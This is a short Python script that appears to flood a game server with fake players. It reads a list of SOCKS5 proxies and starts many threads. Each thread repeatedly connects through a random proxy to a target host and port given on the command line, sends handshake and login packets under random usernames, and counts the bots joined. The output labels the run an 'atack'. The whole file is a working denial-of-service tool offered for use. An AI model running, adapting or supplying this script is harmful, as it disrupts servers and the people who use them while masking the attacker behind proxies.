import time, socket, random, string, sys, socks
from threading import Thread
f = open('proxys.txt', 'r').readlines()
how = 0
def new_bot():
    global how
    while 1:
        m = random.choice(f).split(':')
        usr = random.choice(string.ascii_uppercase) + str(random.randint(10000, 999999))
        try:
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setproxy(socks.PROXY_TYPE_SOCKS5, m[0], int(m[1]))
            sock.connect((host, port))
            sock.send("\x06\x00%s\x00\x00\x00\x02" % chr(47))
            sock.send("\x09\x00\x07" + usr)
            how += 1
            sys.stdout.write('\r[%s / %s] joined!' % (how, usr))
            time.sleep(1)
            sock.close()
        except Exception as err:
            sock.close()
            print("[%s / %s] errored %s" % (how, usr, err))
if len(sys.argv) == 4:
    host, port, threads = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
    print('Starting atack on %s:%s with %s thread(s)' % (host, str(port), str(threads)))
    time.sleep( 2 )
    for i in range(threads): Thread(target=new_bot).start()
else:
    print('ip poirt threads')
    sys.exit()
